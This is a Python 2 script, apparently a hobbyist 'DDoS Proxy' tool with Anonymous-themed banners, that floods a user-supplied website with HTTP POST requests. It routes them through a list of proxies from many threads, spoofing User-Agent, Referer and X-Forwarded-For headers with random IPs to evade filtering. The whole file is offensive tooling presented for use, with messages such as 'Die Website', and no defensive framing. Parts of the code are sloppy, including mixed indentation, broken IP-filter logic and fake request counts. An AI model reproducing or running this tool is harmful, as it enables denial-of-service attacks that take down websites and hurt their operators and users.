#!/usr/bin/env python
#coding: utf8
#Tool DDoS Proxy by SGDvsDT

import os
import random
import socket
import threading
import time
from random import randrange
from threading import Lock
from threading import Thread

host = "host_url"

userAgents = [
		"BabalooSpider/1.3 (BabalooSpider; http://www.babaloo.si; spider@babaloo.si)",	
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5001; Windows NT 5.1; Trident/4.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5000; Windows NT 5.1; Trident/4.0; FunWebProducts)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5000; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.27; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.27; Windows NT 5.1; Trident/4.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.17; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.168; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.168; Windows NT 5.1; Trident/4.0; GTB7.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.130; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.130; Windows NT 5.1; Trident/4.0; FunWebProducts; GTB6.6; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; yie8)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.12; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.12; Windows NT 5.1; Trident/4.0; GTB6.3)",]
 
reFerers = [
		"http://validator.w3.org/check?uri=",
		"https://www.facebook.com/l.php?u=",
		"https://drive.google.com/viewerng/viewer?url=",
		"http://www.google.com/translate?u=",
		"https://plus.google.com/share?url="
		"http://www.google.com/?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
		"https://drive.google.com/viewerng/viewer?url=",
		"http://www.google.com/translate?u=",
		"https://developers.google.com/speed/pagespeed/insights/?url=",
		"http://help.baidu.com/searchResult?keywords=",
		"http://www.bing.com/search?q=",
		"https://add.my.yahoo.com/rss?url=",
		"https://twitter.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.facebook.com/l.php?u=",
		"https://drive.google.com/viewerng/viewer?url=",
		"http://www.google.com/translate?u=",
		"http://louis-ddosvn.rhcloud.com/f5.html?v=",
		"https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
		"http://www.google.com/?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
		"https://drive.google.com/viewerng/viewer?url=",
		"http://www.google.com/translate?u=",
		"https://developers.google.com/speed/pagespeed/insights/?url=",
		"http://help.baidu.com/searchResult?keywords=",
		"http://www.bing.com/search?q=",
		"https://add.my.yahoo.com/rss?url=",
		"https://twitter.com/search?q=",
		"https://play.google.com/store/search?q="
		"https://plus.google.com/share?url=" ]
		
def randomIp():
        random.seed()
        result = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "."
        result = result + str(random.randint(1, 254)) + "." + str(random.randint(1, 254))
        return result
def generateip():
        notvalid = [10, 127, 169, 172, 192]
        first = randrange(1, 254)
        while first is notvalid:
            first = randrange(1, 254)
        _ip = ".".join([str(first), str(randrange(1, 254)),
        str(randrange(1, 254)), str(randrange(1, 254))])
        return _ip
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + generateip() + ", "
    return res[0:len(res) - 2]
 
#def randomUserAgent():
    #return random.choice(userAgents)

#def randomReFerer():
    #return random.choice(reFerers)  
					
class attacco(threading.Thread):
    def run(self):
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
		#useragent = "User-Agent: " + randomUserAgent() + "\r\n"
	useragent = "User-Agent: " + random.choice(zombie) + "\r\n"
	forward   = "X-Forwarded-For: " + randomIpList() + generateip() + "\r\n"
	#referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(1000, 10000)) + "\r\n"
	referer   = "Referer: "+ random.choice(Bot) + url + "?r="+ str(random.randint(10000, 50000)) + "\r\n"
	httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
        while nload:
            time.sleep(0.5)
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(13):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')
 
#Main
os.system("color d")

print "LOADING CODE.....        "

print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(0.5)
print "[==========          ] 50%"
time.sleep(0.4)
print "[===============     ] 75%"
time.sleep(0.35)
print "[====================] 100%"
time.sleep(0.2) 

print '----------------------------------------------------------------------'
print '|                       WELCOME TO MY TOOL DDoS =D                    ' 
print '----------------------------------------------------------------------'
print \
"""		     ___________________________________________________
            /                                                   \
           |    _____________________________________________    |
           |   |                                             |   |
           |   |                                             |   |
           |   | root@onion.land:~# We are Anonymous.        |   |
           |   | root@onion.land:~# We are Legion.           |   |
           |   | root@onion.land:~# We do not forgive.       |   |	
           |   | root@onion.land:~# We do not forget.        |   |
           |   | root@onion.land:~# Expect us.               |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |                                             |   |
           |   |_____________________________________________|   |
           |                                                     |
            \____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'
"""
print '---------------------------------------------------'

print '...........:::::>SDGvsDT DDoS v. 21.0 <:::::.......'

print '---------------------------------------------------'
# Site/IP
url = raw_input(">Site: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
#Zombie
in_file = open(raw_input(">Zombie: "),"r")
zombie = in_file.read()
#Bot
in_file = open(raw_input(">Bot: "),"r")
Bot = in_file.read()
#Proxy
in_file = open(raw_input(">Proxy: "),"r")
proxyf = in_file.read()
in_file.close()
listaproxy = proxyf.split('\n')
#Dame
thread = input(">DAME(750): ")
#Attack
get_host = "POST " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0

for x in xrange(int(thread + 1)):
		attacco().start()
		time.sleep(0.0000000000000000000001)
		print "#~~~>Requests DDoS Attack's Sended: " + str(random.randint(1000, 99999)) + "<~~~#" + "!"

print '---------------------------------------------------------- '	
print " ------------>>>>>DoS Attack WebSite<<<<<----------------- "
print "------------>>>>>    Die Website    <<<<<----------------- "                  
print "   ------------>>>>>Tool By SGDvsDT <<<<<----------------- "
print '---------------------------------------------------------- '
print '---------------------------------------------------------- '
print "   ,_______________________.~"
print "   !       SGDvsDT       !0!  ~ --ATTACK-- ==> 'Fuck you Admin !!!'1000000000000000000000000000000000000000000000000rq/s'"
print "   !---> ________________! !~"
print "   !     _____===========!_!"
print "   /     /__/"
print "  / Zom /"
print " / Bie /"
print "/_____/"
	#time.sleep(2)
	#sent = sent + 1
	#print " Send %s packet to victim throught port %s" %(sent,port)
print '---------------------------------------------------------- '
print "Ctrl + C or Ctrl + Z to stop code ..."
print '---------------------------------------------------------- '
nload = 0
while not nload:
	time.sleep(1)
	
